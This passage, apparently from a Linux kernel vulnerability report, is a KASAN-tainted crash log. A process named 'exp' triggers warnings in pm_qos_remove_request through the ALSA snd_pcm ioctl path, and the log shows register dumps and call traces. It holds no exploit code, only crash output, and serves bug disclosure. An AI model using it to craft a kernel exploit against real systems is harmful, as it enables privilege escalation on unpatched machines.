+[ 141.594762] fb_sys_fops syscopyarea
+
+[ 141.594763] rapl
+
+[ 141.594764] sysfillrect sysimgblt
+
+[ 141.594766] input_leds
+
+[ 141.594767] drm parport_pc
+
+[ 141.594768] serio_raw
+
+[ 141.594769] ppdev
+
+[ 141.594770] snd
+
+[ 141.594771] lp parport
+
+[ 141.594773] vboxguest
+
+[ 141.594774] ip_tables x_tables
+
+[ 141.594775] soundcore
+
+[ 141.594776] autofs4 hid_generic
+
+[ 141.594778] mac_hid
+
+[ 141.594779] usbhid hid
+
+[ 141.594780] sch_fq_codel
+
+[ 141.594781] psmouse crc32_pclmul
+
+[ 141.594783] vmwgfx
+
+[ 141.594784] ahci libahci
+
+[ 141.594785] ttm
+
+[ 141.594786] e1000 i2c_piix4
+
+[ 141.594788] drm_kms_helper
+
+[ 141.594818] pata_acpi video
+
+[ 141.594821] fb_sys_fops
+
+[ 141.594823] syscopyarea sysfillrect
+
+[ 141.594826] CPU: 1 PID: 1956 Comm: exp Tainted: G B 5.4.166 #1
+
+[ 141.594827] sysimgblt drm parport_pc
+
+[ 141.594830] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
+VirtualBox 12/01/2006
+
+[ 141.594830] ppdev lp parport
+
+[ 141.594835] RIP: 0010:pm_qos_remove_request+0x204/0x2c0
+
+[ 141.594836] ip_tables x_tables autofs4
+
+[ 141.594839] Code: 48 c1 ea 03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 9c 00
+00 00 4d 63 6c 24 28 e9 8d fe ff ff 48 c7 c7 e0 44 4d ba e8 7f 10 f1 01
+<0f> 0b 5b 41 5c 41 5d 41 5e 41 5f 5d c3 48 b8 00 00 00 00 00 fc ff
+
+[ 141.594840] hid_generic usbhid hid
+
+[ 141.594843] RSP: 0018:ffff8880b366fbb8 EFLAGS: 00010282
+
+[ 141.594844] psmouse crc32_pclmul
+
+[ 141.594846] ahci libahci e1000
+
+[ 141.594849] RAX: 0000000000000000 RBX: ffffffffc0b416e0 RCX:
+0000000000000000
+
+[ 141.594849] i2c_piix4 pata_acpi video
+
+[ 141.594852] RDX: 0000000000000001 RSI: 0000000000000008 RDI:
+ffffed10166cdf69
+
+[ 141.594854] RBP: ffff8880b366fbe0 R08: 0000000000000001 R09:
+ffffed10193d551b
+
+[ 141.594857] CPU: 2 PID: 1948 Comm: exp Tainted: G B 5.4.166 #1
+
+[ 141.594858] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
+VirtualBox 12/01/2006
+
+[ 141.594859] R10: ffffed10193d551a R11: ffff8880c9eaa8d7 R12:
+ffff888035191440
+
+[ 141.594861] R13: ffff888035191594 R14: ffff888035191400 R15:
+ffff888035191468
+
+[ 141.594863] RIP: 0010:pm_qos_remove_request+0x204/0x2c0
+
+[ 141.594866] Code: 48 c1 ea 03 0f b6 04 02 84 c0 74 08 3c 03 0f 8e 9c 00
+00 00 4d 63 6c 24 28 e9 8d fe ff ff 48 c7 c7 e0 44 4d ba e8 7f 10 f1 01
+<0f> 0b 5b 41 5c 41 5d 41 5e 41 5f 5d c3 48 b8 00 00 00 00 00 fc ff
+
+[ 141.594868] FS: 00007fab6baab700(0000) GS:ffff8880c9e80000(0000)
+knlGS:0000000000000000
+
+[ 141.594869] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+
+[ 141.594871] RSP: 0018:ffff88809d6ffbb8 EFLAGS: 00010282
+
+[ 141.594873] CR2: 00007fab66aa0e78 CR3: 000000004d344005 CR4:
+00000000000606e0
+
+[ 141.594874] RAX: 0000000000000000 RBX: ffffffffc0b416e0 RCX:
+0000000000000000
+
+[ 141.594876] RDX: 0000000000000001 RSI: 0000000000000008 RDI:
+ffffed1013adff69
+
+[ 141.594878] RBP: ffff88809d6ffbe0 R08: 0000000000000001 R09:
+ffffed10193e551b
+
+[ 141.594879] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
+0000000000000000
+
+[ 141.594881] R10: ffffed10193e551a R11: ffff8880c9f2a8d7 R12:
+ffff888035191440
+
+[ 141.594882] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
+0000000000000400
+
+[ 141.594884] R13: ffff888035191594 R14: ffff888035191400 R15:
+ffff888035191468
+
+[ 141.594885] Call Trace:
+
+[ 141.594888] FS: 00007fab6fab3700(0000) GS:ffff8880c9f00000(0000)
+knlGS:0000000000000000
+
+[ 141.594894] snd_pcm_common_ioctl+0x5f2/0x1b00 [snd_pcm]
+
+[ 141.594896] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+
+[ 141.594901] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]
+
+[ 141.594903] CR2: 000055cff0604b28 CR3: 000000004d344002 CR4:
+00000000000606e0
+
+[ 141.594909] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]
+
+[ 141.594911] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
+0000000000000000
+
+[ 141.594913] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7:
+0000000000000400
+
+[ 141.594915] do_vfs_ioctl+0x9da/0x1020
+
+[ 141.594916] Call Trace:
+
+[ 141.594919] ? ioctl_preallocate+0x1c0/0x1c0
+
+[ 141.594922] ? __kasan_check_write+0x14/0x20
+
+[ 141.594927] snd_pcm_common_ioctl+0x5f2/0x1b00 [snd_pcm]
+
+[ 141.594930] ? __fget+0x21c/0x3d0
+
+[ 141.594935] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]
+
+[ 141.594939] ? copy_fd_bitmaps+0x2e0/0x2e0
+
+[ 141.594944] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]
+
+[ 141.594947] ? __switch_to_asm+0x40/0x70
+
+[ 141.594949] do_vfs_ioctl+0x9da/0x1020
+
+[ 141.594951] ? __switch_to_asm+0x34/0x70
+
+[ 141.594953] ? ioctl_preallocate+0x1c0/0x1c0
+
+[ 141.594955] ? __switch_to_asm+0x40/0x70
+
+[ 141.594957] ? __kasan_check_write+0x14/0x20
+
+[ 141.594960] ? __fget+0x21c/0x3d0
+
+[ 141.594961] ? __switch_to_asm+0x34/0x70
+
+[ 141.594965] ? __fget_light+0x17e/0x1f0
+
+[ 141.594967] ? copy_fd_bitmaps+0x2e0/0x2e0
+
+[ 141.594969] ? __switch_to_asm+0x40/0x70
+
+[ 141.594971] ksys_ioctl+0x67/0x90
+
+[ 141.594974] ? __switch_to_asm+0x34/0x70
+
+[ 141.594976] __x64_sys_ioctl+0x73/0xb0
+
+[ 141.594979] ? fpregs_assert_state_consistent+0x22/0xa0
+
+[ 141.594980] ? __switch_to_asm+0x40/0x70
+
+[ 141.594982] ? __switch_to_asm+0x34/0x70
+
+[ 141.594985] do_syscall_64+0x9f/0x3c0
+
+[ 141.594988] ? syscall_return_slowpath+0x1a5/0x220
+
+[ 141.594990] ? __fget_light+0x17e/0x1f0
+
+[ 141.594993] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[ 141.594995] ksys_ioctl+0x67/0x90
+
+[ 141.594998] RIP: 0033:0x4e68b7
+
+[ 141.595000] __x64_sys_ioctl+0x73/0xb0
+
+[ 141.595002] ? fpregs_assert_state_consistent+0x22/0xa0
+
+[ 141.595004] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
+90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
+<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
+
+[ 141.595006] RSP: 002b:00007fab6baaada8 EFLAGS: 00000246
+
+[ 141.595008] do_syscall_64+0x9f/0x3c0
+
+[ 141.595009] ORIG_RAX: 0000000000000010
+
+[ 141.595011] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
+00000000004e68b7
+
+[ 141.595012] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
+0000000000000003
+
+[ 141.595015] ? syscall_return_slowpath+0x1a5/0x220
+
+[ 141.595017] RBP: 00007fab6baaadb0 R08: 00007fab6baab700 R09:
+00007fab6baab700
+
+[ 141.595019] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[ 141.595021] RIP: 0033:0x4e68b7
+
+[ 141.595022] R10: 00007fab6baab9d0 R11: 0000000000000246 R12:
+00007fab6baaae80
+
+[ 141.595024] R13: 0000000000000000 R14: 0000000000000000 R15:
+00007ffe52234d70
+
+[ 141.595026] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
+90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
+<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
+
+[ 141.595027] RSP: 002b:00007fab6fab2da8 EFLAGS: 00000246 ORIG_RAX:
+0000000000000010
+
+[ 141.595030] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
+00000000004e68b7
+
+[ 141.595031] ---[ end trace 86992d9d3bd66364 ]---
+
+[ 141.595033] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
+0000000000000003
+
+[ 141.595035] RBP: 00007fab6fab2db0 R08: 00007fab6fab3700 R09:
+00007fab6fab3700
+
+[ 141.595037] R10: 00007fab6fab39d0 R11: 0000000000000246 R12:
+00007fab6fab2e80
+
+[ 141.595038] R13: 0000000000000000 R14: 0000000000000000 R15:
+00007ffe52234d70
+
+[ 141.595043] ---[ end trace 86992d9d3bd66365 ]---
+
+```
+
+Content of type "text/html" skipped
+
+View attachment "Report.md" of type "text/markdown" (29011 bytes)
